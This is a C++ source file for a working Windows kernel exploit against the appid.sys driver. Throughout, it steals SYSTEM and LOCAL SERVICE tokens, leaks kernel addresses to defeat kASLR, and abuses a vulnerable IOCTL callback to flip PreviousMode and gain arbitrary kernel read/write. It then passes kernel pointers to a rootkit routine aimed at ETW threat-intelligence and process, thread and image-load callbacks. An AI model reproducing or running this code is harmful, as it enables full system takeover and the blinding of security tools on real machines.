#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <sddl.h>
#include <Psapi.h>
#include "structs.h"

#include "rktools.h"


// NtWriteVirtualMemory global var, initialized in main()
_NtWriteVirtualMemory pNtWriteVirtualMemory = NULL;


///// BEGIN TOKEN STEALING FUNCTIONS /////
// Obtain current token for this thread/process
HANDLE GetCurrentToken() {
	HANDLE hToken = NULL;

	// Attempt to open thread token first, followed by process token
	if (!OpenThreadToken((HANDLE)-2, TOKEN_ALL_ACCESS, FALSE, &hToken)) {
		if (!OpenProcessToken((HANDLE)-1, TOKEN_ALL_ACCESS, &hToken)) {
			printf("[-] OpenProcessToken Failed With Error: 0x%0.8X \n", GetLastError());
			hToken = NULL;
		}
	}
	return hToken;
}

// Print user associated with token
BOOL checkToken(HANDLE hToken, OUT LPWSTR* szUsername) {
	BOOL bResult = FALSE;
	SID_NAME_USE SidName;
	DWORD tokInfoLen = 0;
	ULONG uUserLen = 0x00, uDomnLen = 0x00, uTotalLength = 0x00;
	PVOID pUserStr = NULL, pDomainStr = NULL;
	PTOKEN_USER pTokenInfo = NULL;

	// Check input parameters
	if (!hToken || !szUsername) return FALSE;

	// Query info for current token to get length
	GetTokenInformation(hToken, TokenUser, nullptr, tokInfoLen, &tokInfoLen);
	if (tokInfoLen == 0) {
		printf("[-] GetTokenInformation failed with error: 0x%x\n", GetLastError());
		return FALSE;
	}
	// Allocate TOKEN_USER struct large enough to store data
	if (!(pTokenInfo = (PTOKEN_USER)LocalAlloc(LPTR, tokInfoLen))) {
		printf("[-] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}
	// Query info again to populate TOKEN_USER struct (pTokenInfo)
	if (!GetTokenInformation(hToken, TokenUser, pTokenInfo, tokInfoLen, &tokInfoLen)) {
		printf("[-] GetTokenInformation failed with error: 0x%x\n", GetLastError());
		goto _END_OF_FUNC;
	}

	// Execute LookupAccountSidW to obtain length values of username and domain name
	if (!LookupAccountSidW(NULL, pTokenInfo->User.Sid, NULL, &uUserLen, NULL, &uDomnLen, &SidName)) {
		// Calculate length of LPWSTR needed to store user and domain names
		uTotalLength = (uUserLen * sizeof(WCHAR)) + (uDomnLen * sizeof(WCHAR)) + sizeof(WCHAR);

		// Allocate buffer to store LPWSTR
		if (!(*szUsername = (LPWSTR)LocalAlloc(LPTR, uTotalLength))) {
			printf("[-] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
			goto _END_OF_FUNC;
		}
		// Set pointers for domain and user strings inside allocated memory
		pDomainStr = *szUsername;
		pUserStr = (*szUsername) + uDomnLen;

		// Lookup domain\username associated with token SID
		if (!LookupAccountSidW(NULL, pTokenInfo->User.Sid, (LPWSTR)(pUserStr), &uUserLen, (LPWSTR)pDomainStr, &uDomnLen, &SidName)) {
			printf("[-] LookupAccountSidW Failed With Error: %d\n", GetLastError());
			goto _END_OF_FUNC;
		}
		(*szUsername)[uDomnLen] = L'\\';
	}

	// Clean up data and return
_END_OF_FUNC:
	if (pTokenInfo)
		LocalFree(pTokenInfo);
	if (!bResult && *szUsername)
		LocalFree(*szUsername);
	return bResult;
}

// Enable privileges on a token, such as SeDebugPrivilege
BOOL SetPrivilege(HANDLE hToken, LPCWSTR szPrivilegeName) {
	TOKEN_PRIVILEGES	TokenPrivs = { 0x00 };
	LUID				Luid = { 0x00 };

	// Obtain LUID value for target privilege name
	if (!LookupPrivilegeValueW(NULL, szPrivilegeName, &Luid)) {
		printf("[-] LookupPrivilegeValueW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}
	// Setup TOKEN_PRIVILEGES struct
	TokenPrivs.PrivilegeCount = 0x01;	// Adjusting one privilege (one element of the 'Privileges' structure array)
	TokenPrivs.Privileges[0].Luid = Luid;
	TokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Enable privilege
	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		printf("[-] AdjustTokenPrivileges Failed With Error: %d \n", GetLastError());
		return FALSE;
	}
	// Check for other errors (privilege not available for process)
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		printf("[-] Not All Privileges Referenced Are Assigned To The Caller \n");
		return FALSE;
	}

	return TRUE;
}

// Open handle to token from target PID
HANDLE StealToken(ULONG Pid) {
	HANDLE TokenHandle = NULL;
	HANDLE ProcessHandle = { 0 };

	// Open a handle to the process id to steal the primary token from
	if (!(ProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, Pid))) {
		//printf("[-] OpenProcess PID %d Failed with Error: %lx\n", Pid, GetLastError());
		goto _END_OF_FUNC;
	}

	// Open a handle to the primary access token from the specified process handle 
	if (!OpenProcessToken(ProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle)) {
		//printf("[-] OpenProcessToken PID %d Failed with Error: 0x%lx\n", Pid, GetLastError());
		goto _END_OF_FUNC;
	}

	// Clean up data and return
_END_OF_FUNC:
	if (ProcessHandle) {
		CloseHandle(ProcessHandle);
	}
	return TokenHandle;
}

// Find process for token stealing, check if it belongs to target user, then duplicate its token
HANDLE obtainTokenFromProcess(LPCWSTR targetName, LPCWSTR targetUser, int skips) {
	// Token steal vars
	HANDLE hTargetToken = NULL;
	LPWSTR targetTokenUser = { 0 };

	// Procentry vars
	HANDLE hProcSnap, hProcess = { 0 };
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Begin scanning process list
	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcSnap == INVALID_HANDLE_VALUE) return 0;
	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}
	// Track starting PID of process list
	DWORD firstPid = pe32.th32ProcessID;
	int i = 0;

	// Process loop to find valid target
	while (Process32Next(hProcSnap, &pe32)) {
		// Break loop if list has been completely looped through (starting PID shows up again)
		if (pe32.th32ProcessID == firstPid && i >= 1) { break; }
		i++;

		// Check process name
		if (lstrcmpW(targetName, pe32.szExeFile) == 0) {
			// Steal token from target PID
			hTargetToken = StealToken(pe32.th32ProcessID);
			if (hTargetToken != NULL) {

				// Obtain username associated with stolen token
				checkToken(hTargetToken, &targetTokenUser);

				// Check username against expected username
				if (lstrcmpW(targetTokenUser, targetUser) == 0) {
					// Exhaust 'skips' counter 
					if (skips > 0) { skips--; }
					// Return stolen token
					else {
						wprintf(L"[+] Obtained token for %s from PID %d\n", targetTokenUser, pe32.th32ProcessID);
						goto _END_OF_FUNC;
					}
				}
				// If not correct token, clean up and continue to next process
				CloseHandle(hTargetToken);
				hTargetToken = NULL;
				targetTokenUser = { 0 };
			}
		}
	}
	// Clean up data and return
	_END_OF_FUNC:
	CloseHandle(hProcSnap);
	return hTargetToken;
}

// Check if running as SYSTEM or LOCAL SERVICE. If not, steal system token and impersonate LOCAL SERVICE
//	Once running as LOCAL SERVICE open a handle to appid driver. If this fails, revert token and try with new PID
HANDLE getSvc(OUT HANDLE *phAppid) {
	// Define handle vars
	HANDLE hCurToken = NULL, systemToken = NULL, svcToken = NULL;

	// Get current token
	hCurToken = GetCurrentToken();
	if (hCurToken == NULL) {
		printf("[-] Failed to obtain process token\n");
	}
	// Check current user context
	LPWSTR curTokenUser = { 0 };
	checkToken(hCurToken, &curTokenUser);
	wprintf(L"[*] Current token user: %s\n", curTokenUser);

	// If not LOCAL SERVICE, elevate privileges and steal token from svchost
	if (lstrcmpW(curTokenUser, L"NT AUTHORITY\\LOCAL SERVICE") != 0) {
		printf("[*] Not running as NT AUTHORITY\\LOCAL SERVICE\n");

		// Attempt to obtain handle to appid.sys with LOCAL SERVICE account
		int i = 0; // Counter to skip each invalid svchost.exe process
		do {
			// Elevate to SYSTEM
			if (lstrcmpW(curTokenUser, L"NT AUTHORITY\\SYSTEM") != 0) {
				printf("[*] Elevating to SYSTEM token\n");
				systemToken = obtainTokenFromProcess(L"winlogon.exe", L"NT AUTHORITY\\SYSTEM", 0);
				if (systemToken == NULL) {
					printf("[-] Failed to steal SYSTEM token, exiting\n");
					goto _END_OF_FUNC;
				}
				if (!ImpersonateLoggedOnUser(systemToken)) {
					printf("[-] ImpersonateLoggedOnUser Failed with Error: %lx\n", GetLastError());
					goto _END_OF_FUNC;
				}
				printf("[+] Impersonated NT AUTHORITY\\SYSTEM\n");
			}

			// Steal LOCAL SERVICE token from svchost.exe
			svcToken = obtainTokenFromProcess(L"svchost.exe", L"NT AUTHORITY\\LOCAL SERVICE", i);
			if (svcToken == NULL) {
				printf("[-] Failed to steal LOCAL SERVICE token, exiting\n");
				goto _END_OF_FUNC;
			}
			if (!ImpersonateLoggedOnUser(svcToken)) {
				printf("[-] ImpersonateLoggedOnUser Failed with Error: %lx\n", GetLastError());
				goto _END_OF_FUNC;
			}
			printf("[+] Impersonated NT AUTHORITY\\LOCAL SERVICE\n");

			// Attempt to get handle to appid.sys to call vulnerable IOCTL
			*phAppid = CreateFile(L"\\\\.\\AppID", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
			if (*phAppid == INVALID_HANDLE_VALUE || *phAppid == NULL) {
				printf("[-] Could not obtain handle to Appid.sys with token, trying again\n");
				// Revert token and clean up handles before trying again
				RevertToSelf();
				if (hCurToken)		{ CloseHandle(hCurToken); }
				if (systemToken)	{ CloseHandle(systemToken); }
				*phAppid = NULL;
				i++; // increment 'skips' counter every time Appid.sys handle fails
			}
		} while (*phAppid == NULL);

	}
	printf("[+] Opened handle to appid.sys driver\n");

	// Clean up data and return
_END_OF_FUNC:
	if (hCurToken) {
		CloseHandle(hCurToken);
	}
	if (systemToken) {
		CloseHandle(systemToken);
	}
	return svcToken;
}


///// BEGIN KASLR BYPASS FUNCTIONS /////
// Leak kernel-mode address of handle associated with given PID
LPVOID leakKernHandle(DWORD pid, HANDLE hLeak) {
	LPVOID leakAddr = NULL;

	// Resolve NtQuerySystemInformation API
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	_NtQuerySystemInformation query = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("[-] GetProcAddress failed\n");
		return leakAddr;
	}

	// Execute NtQuerySystemInformation until there is no more data to return (0xc0000004)
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);
		status = query(SystemExtendedHandleInformation, pHandleInfo, len, &len);
	} while (status == (NTSTATUS)0xc0000004);
	if (status != (NTSTATUS)0x0) {
		printf("[-] NtQuerySystemInformation failed with error code 0x%X\n", status);
		goto _END_OF_FUNC;
	}

	// Iterate through returned handles to find kernel mode address for the associated object
	for (int i = 0; i < pHandleInfo->HandleCount; i++) {
		if (pid == (DWORD)(pHandleInfo->Handles[i].UniqueProcessId) &&
			hLeak == pHandleInfo->Handles[i].HandleValue)
		{
			leakAddr = pHandleInfo->Handles[i].Object;
			goto _END_OF_FUNC;
		}
	}

_END_OF_FUNC:
	if (hLeak) { CloseHandle(hLeak); }
	if (pHandleInfo) { GlobalFree(pHandleInfo); }
	return leakAddr;
}

// Get base address of a kernel driver 
LPVOID GetBaseAddr(LPCWSTR drvname)
{
	LPVOID drivers[1024];
	DWORD cbNeeded;
	int nDrivers, i = 0;

	// Retrieve list of drivers with EnumDeviceDrivers
	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		WCHAR szDrivers[1024];
		nDrivers = cbNeeded / sizeof(drivers[0]);

		// Iterate through the list, checking each driver's name
		for (i = 0; i < nDrivers; i++)
		{
			if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
			{
				// If driver name is correct, return its base address
				if (wcscmp(szDrivers, drvname) == 0)
				{
					return drivers[i];
				}
			}
		}
	}
	return 0;
}

// Read section of memory into buffer and search for opcode pattern
BOOL ScanSectionForPattern(HANDLE hProcess, LPVOID lpBaseAddress, SIZE_T dwSize, BYTE* pattern, SIZE_T patternSize, LPVOID* lpFoundAddress) {
	BYTE* buffer = (BYTE*)malloc(dwSize);
	SIZE_T bytesRead;

	if (!ReadProcessMemory(hProcess, lpBaseAddress, buffer, dwSize, &bytesRead)) {
		free(buffer);
		return FALSE;
	}

	for (SIZE_T i = 0; i < dwSize - patternSize; i++) {
		BOOL found = TRUE;
		for (SIZE_T j = 0; j < patternSize; j++) {
			if (buffer[i + j] != pattern[j]) {
				found = FALSE;
				break;
			}
		}
		if (found) {
			*lpFoundAddress = (LPVOID)((DWORD_PTR)lpBaseAddress + i);
			free(buffer);
			return TRUE;
		}
	}

	free(buffer);
	return FALSE;
}

// Search sections of supplied PE to find RVA of target opcode sequence
ULONGLONG FindGadget(HMODULE lpFileName, unsigned char pattern[], SIZE_T patternSize, int skips)
{
	ULONGLONG relativeOffset = 0;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpFileName;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)lpFileName + pDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
	LPVOID lpFoundAddress = NULL;

	// Scan sections of supplied driver for PAGE section
	for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
		if (strcmp((CHAR*)pSectionHeader[i].Name, "PAGE") == 0) {
			LPVOID lpSectionBaseAddress = (LPVOID)((LPBYTE)lpFileName + pSectionHeader[i].VirtualAddress);
			SIZE_T dwSectionSize = pSectionHeader[i].Misc.VirtualSize;

			// Scan for supplied pattern of bytes 
			if (ScanSectionForPattern(GetCurrentProcess(), lpSectionBaseAddress, dwSectionSize, pattern, patternSize, &lpFoundAddress)) {
				//printf("[DEBUG] Starting address of ExpProfileDelete: 0x%llx\n", lpFoundAddress);
				// Calculate the relative offset
				relativeOffset = (ULONGLONG)lpFoundAddress - (ULONGLONG)lpFileName;
			}
			else {
				printf("[-] Unable to find RVA of ExpProfileDelete function\n");
			}
			break;
		}
	}
	return relativeOffset;
}




///// READ AND WRITE PRIMITIVE FUNCTIONS /////
// read primitive
ULONGLONG readqword(HANDLE hDriver, ULONGLONG where) {
	ULONGLONG read_qword = 0;
	SIZE_T read_bytes;

	if (!ReadProcessMemory((HANDLE)-1, (LPVOID)where, &read_qword, sizeof(ULONGLONG), &read_bytes))
	{
		printf("[-] Error while calling ReadProcessMemory(): %d\n", GetLastError());
		return 1;
	}
	return read_qword;
}

// write primitive
void writeqword(HANDLE hDriver, ULONGLONG where, ULONGLONG what) {
	NTSTATUS status = pNtWriteVirtualMemory((HANDLE)-1, (LPVOID)where, &what, sizeof(ULONGLONG), NULL);
	if (status != 0) {
		printf("[-] NtWriteVirtualMemory failed with status 0x%x\n", status);
	}
}


// Leak kernel memory to bypass kASLR, impersonate LOCAL SERVICE, exploit Appid driver callback
int main() {
	// Initialize struct for rootkit functionality, will be populated throughout exploit
	PEXP_OUT rootStruct = new EXP_OUT;
	// Set read and write primitive functions
	rootStruct->readprimitive = (LPVOID)readqword;
	rootStruct->writeprimitive = (LPVOID)writeqword;


	// Initialize NtWriteVirtualMemory function (used for write primitive)
	pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");

	// Enable SeDebugPrivilege for current token
	HANDLE TokenHandle = { 0 };
	if ((TokenHandle = GetCurrentToken())) {
		if (SetPrivilege(TokenHandle, L"SeDebugPrivilege")) {
			printf("[+] SeDebugPrivilege enabled\n");
		}
		CloseHandle(TokenHandle);
		TokenHandle = NULL;
	}



	///// LEAK KERNEL MODE OBJECT AND FUNCTION ADDRESSES FOR EXPLOIT /////
	// Obtain current PID to filter handles (and copy into rootkit struct)
	DWORD myPid = GetCurrentProcessId();
	rootStruct->myProcessId = myPid;

	// Leak KTHREAD for current process (used to find address of PreviousMode bit)
	HANDLE curKthread = NULL;
	DWORD myTid = GetCurrentThreadId();
	HANDLE myhThread = OpenThread(THREAD_QUERY_INFORMATION, false, myTid);
	if (myhThread == INVALID_HANDLE_VALUE) {
		printf("[-] OpenThread to self failed\n");
		return 1;
	}
	printf("[*] Opened thread handle to self: 0x%x\n", (DWORD)myhThread);
	curKthread = leakKernHandle(myPid, myhThread);
	if (curKthread == NULL) { return 1; }
	printf("[+] Leaked KTHREAD for current process: 0x%llx\n", (ULONGLONG)curKthread);

	// Leak valid file handle (used to avoid BSOD in FsRtlSetKernelEaFile function)
	HANDLE kEaFile = NULL;
	LPCWSTR fName = L"C:\\Temp51231";
	HANDLE eaFile = CreateFileW(fName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL
	);
	HANDLE hExtra = NULL;
	// Create extra handle to increase reference count (helps avoid BSOD)
	DuplicateHandle((HANDLE)-1, eaFile, (HANDLE)-1, &hExtra, NULL, false, DUPLICATE_SAME_ACCESS);
	if (eaFile == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to create temporary file: %ls\n", fName);
		return 1;
	}
	printf("[*] Opened file handle: 0x%x\n", (DWORD)eaFile);
	kEaFile = leakKernHandle(myPid, eaFile);
	if (kEaFile == NULL) { return 1; }
	printf("[+] Leaked kernel file object: 0x%llx\n", (ULONGLONG)kEaFile);


	// Load ntoskrnl into memory to find offset to nt!ExpProfileDelete function 
	HMODULE umodeNtoskrnl = LoadLibraryW(L"C:\\Windows\\System32\\ntoskrnl.exe");
	if (umodeNtoskrnl == NULL) {
		printf("[-] Error while loading ntoskrnl: %d\n", GetLastError());
		return false;
	}
	// Resolve kernel-mode address of ExpProfileDelete
	unsigned char searchExpProfileDelete[] = {
		0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83,
		0x79, 0x30, 0x00, 0x48, 0x8B, 0xD9, 0x74
	};
	unsigned epdOpcodeSize = sizeof(searchExpProfileDelete) / sizeof(char);
	ULONGLONG umodeOffset = FindGadget(umodeNtoskrnl, searchExpProfileDelete, epdOpcodeSize, 0);
	if (umodeOffset == NULL) {
		printf("[-] Could not resolve nt!ExpProfileDelete in usermode\n");
		return 1;
	}
	// Obtain kernel-mode base address of ntoskrnl.exe
	LPVOID ntosbase = NULL;
	if ((ntosbase = GetBaseAddr(L"ntoskrnl.exe")) == NULL) {
		printf("[-] Could not retrieve base addr of ntoskrnl\n");
		return 1;
	}
	printf("[*] Base address of ntoskrnl: 0x%llx\n", (ULONGLONG)ntosbase);
	// Resolve kernel-mode address of out-of-context call gadget
	ULONGLONG kExpProfileDelete = (ULONGLONG)ntosbase + umodeOffset;	// Add RVA to NT kernel base
	printf("[+] Found kernel mode address of nt!ExpProfileDelete: 0x%llx\n", kExpProfileDelete);


	///// LEAK KERNEL MODE ADDRESSES FOR ROOTKIT POST EX /////
	// Find offset to KeInsertQueueApc in ntoskrnl.exe to disable ETWti
	ULONGLONG KeInsertQueueApcAddr = 0;
	ULONGLONG KIQAoffset = (ULONGLONG)GetProcAddress(umodeNtoskrnl, "KeInsertQueueApc");
	if (KIQAoffset == 0) {
		printf("[-] Could not find KeInsertQueueApc in ntoskrnl\n");
	}	// Calculate pointer by subtracting user-mode base address of ntoskrnl, then adding its kernel-mode base address
	else {
		KeInsertQueueApcAddr = KIQAoffset - (ULONGLONG)umodeNtoskrnl + (ULONGLONG)ntosbase;
		printf("[*] Kernel pointer to KeInsertQueueApc: %llx\n", KeInsertQueueApcAddr);
	}
	// Get address of nt!PsSetCreateProcessNotifyRoutine 
	ULONGLONG ProcCallbackAddr = 0;
	ULONGLONG ProcCallbackOffset = (ULONGLONG)GetProcAddress(umodeNtoskrnl, "PsSetCreateProcessNotifyRoutine");
	if (ProcCallbackOffset == 0) {
		printf("[-] Could not find PsSetCreateProcessNotifyRoutine in ntoskrnl\n");
	}	// Calculate pointer by subtracting user-mode base address of ntoskrnl, then adding its kernel-mode base address
	else {
		ProcCallbackAddr = ProcCallbackOffset - (ULONGLONG)umodeNtoskrnl + (ULONGLONG)ntosbase;
		printf("[*] Kernel pointer to PsSetCreateProcessNotifyRoutine: %llx\n", ProcCallbackAddr);
	}
	// Get address of nt!PsSetCreateThreadNotifyRoutine 
	ULONGLONG ThreadCallbackAddr = 0;
	ULONGLONG ThreadCallbackOffset = (ULONGLONG)GetProcAddress(umodeNtoskrnl, "PsSetCreateThreadNotifyRoutine");
	if (ThreadCallbackOffset == 0) {
		printf("[-] Could not find PsSetCreateThreadNotifyRoutine in ntoskrnl\n");
	}	// Calculate pointer by subtracting user-mode base address of ntoskrnl, then adding its kernel-mode base address
	else {
		ThreadCallbackAddr = ThreadCallbackOffset - (ULONGLONG)umodeNtoskrnl + (ULONGLONG)ntosbase;
		printf("[*] Kernel pointer to PsSetCreateThreadNotifyRoutine: %llx\n", ThreadCallbackAddr);
	}
	// Get address of nt!PsSetLoadImageNotifyRoutine 
	ULONGLONG DllCallbackAddr = 0;
	ULONGLONG DllCallbackOffset = (ULONGLONG)GetProcAddress(umodeNtoskrnl, "PsSetLoadImageNotifyRoutine");
	if (DllCallbackOffset == 0) {
		printf("[-] Could not find PsSetLoadImageNotifyRoutine in ntoskrnl\n");
	}	// Calculate pointer by subtracting user-mode base address of ntoskrnl, then adding its kernel-mode base address
	else {
		DllCallbackAddr = DllCallbackOffset - (ULONGLONG)umodeNtoskrnl + (ULONGLONG)ntosbase;
		printf("[*] Kernel pointer to PsSetLoadImageNotifyRoutine: %llx\n", DllCallbackAddr);
	}

	// Find PsInitialSystemProcess in ntoskrnl to get pointer to SYSTEM EPROCESS (dereference with read primitive)
	ULONGLONG systemProcessOffset = (ULONGLONG)GetProcAddress(umodeNtoskrnl, "PsInitialSystemProcess");
	if (systemProcessOffset == 0) {
		printf("[-] Could not find PsInitialSystemProcess in ntoskrnl\n");
		return 1;
	}

	// Populate struct with newly obtained addresses
	rootStruct->KeInsertQueueApc				= KeInsertQueueApcAddr;
	rootStruct->PsSetCreateProcessNotifyRoutine	= ProcCallbackAddr;
	rootStruct->PsSetCreateThreadNotifyRoutine	= ThreadCallbackAddr;
	rootStruct->PsSetLoadImageNotifyRoutine		= DllCallbackAddr;
	///////////////////////////////////////////////////////////////////////////

	

	///// IMPERSONATE LOCAL SERVICE USER AND OBTAIN HANDLE TO APPID.SYS /////
	// Impersonate LOCAL SERVICE account and obtain handle to appid.sys
	HANDLE hSvcToken = NULL;
	HANDLE hAppid = NULL;
	hSvcToken = getSvc(&hAppid);
	if (hSvcToken == NULL || hAppid == NULL) { return 1; }

	rootStruct->vulnDriver = hAppid;	// Pass vulnerable driver's handle to struct
	///////////////////////////////////////////////////////////////////////////



	///// CREATE INPUTBUFFER AND CALL IOCTL TO EXPLOIT CALLBACK OVERWRITE /////
	// Init variables for IOCTL call
	DWORD controlCode = 0x22A018;
	DWORD lpBytesReturned = 0;

	// Construct input buffer TODO: add code to make length 0x20 for windows 11 (MAYBE, test it)
	SIZE_T inbuf_size = 0x18;
	LPVOID in_buf = VirtualAlloc(0x0, inbuf_size, 0x1000, 0x40);
	if (!in_buf) {
		printf("[-] Allocating memory for input buffer failed\n");
		return 1;
	}
	// Construct output buffer
	SIZE_T outbuf_size = 0x38; 
	LPVOID out_buf = VirtualAlloc(0x0, outbuf_size, 0x1000, 0x40);
	if (!out_buf) {
		printf("[-] Allocating memory for output buffer failed\n");
		return 1;
	}
	// Clear bytes in buffers
	memset(in_buf, 0, inbuf_size);
	memset(out_buf, 0, outbuf_size);

	// Set Out-of-Context call addr to nt!ExpProfileDelete for PreviousMode decrement 
	ULONGLONG oocCall = kExpProfileDelete;
	ULONGLONG pPreviousMode = (ULONGLONG)curKthread + 0x232;

	// Set addresses for kernel callback overwrite
	((ULONGLONG*)in_buf)[0] = (ULONGLONG)(pPreviousMode+0x30);	// previousMode at offset +0x30 passed as arg to callback func
	((ULONGLONG*)in_buf)[1] = (ULONGLONG)kEaFile;				// valid kernel ptr to file object
	((ULONGLONG*)in_buf)[2] = (ULONGLONG)&oocCall;				// callback overwrite function ptr

	// Call vulnerable appid IOCTL
	//	NOTE: the ExpProfileDelete gadget is contingent on the inputbuffer's kernelmode 
	//	address at offset +0x30 containing 0x0. If this fails, a BSOD may occur
	/* DEBUG */
	//printf("[DEBUG] Hitting breakpoint\n");  Sleep(1000); DebugBreak();;
	printf("[*] Calling IOCTL to exploit callback overwrite with nt!ExpProfileDelete\n");
	DeviceIoControl(hAppid, controlCode, in_buf, inbuf_size, out_buf, outbuf_size, &lpBytesReturned, NULL);
	Sleep(3000); // Allow IO to complete before continuing exploit (will crash if you don't)
	///////////////////////////////////////////////////////////////////////////


	
	///// POST EXPLOITATION WITH PREVIOUSMODE SET TO KERNELMODE /////
	// Confirm PreviousMode has been set to kernel mode (=0x0)
	if ((readqword(NULL, pPreviousMode) & 0xFF) != 0x00) {
		printf("[-] Failed to set previous mode\n");
		return 1;
	}
	printf("[+] Previous mode has been set to kernel mode. RW primitives active\n");
	
	// Calculate pointer by subtracting user-mode base address of ntoskrnl, then adding its kernel-mode base address
	ULONGLONG systemProcessAddr = systemProcessOffset - (ULONGLONG)umodeNtoskrnl + (ULONGLONG)ntosbase;
	ULONGLONG iterProc = readqword(NULL, systemProcessAddr);
	printf("[*] Kernel pointer to SYSTEM process: %llx\n", systemProcessAddr);
	
	// Call rootkit 
	rootStruct->systemEprocess = iterProc;	// Set SYSTEM EPROCESS pointer
	rootk(rootStruct);	// Call rootkit functionality for post-exploitation
	


	///// CLEAN UP AND EXIT /////
	// Restore PreviousMode to usermode
	ULONGLONG prevModeQword = readqword(NULL, pPreviousMode);
	ULONGLONG restorePM = prevModeQword ^ 1 << 0;
	writeqword(NULL, pPreviousMode, restorePM);
	printf("[*] Restored previous mode to user mode. Cleaning up and exiting\n");
	Sleep(2000);

	// Free memory
	VirtualFree(in_buf, 0, MEM_RELEASE);
	VirtualFree(out_buf, 0, MEM_RELEASE);
	delete rootStruct;

	// Close handles and revert token
	CloseHandle(hSvcToken);
	CloseHandle(hAppid);
	RevertToSelf();
	DeleteFileW(fName);
	//CloseHandle(eaFile); // Commented out for now in case it decrements object count too far
	
	return 0;

}










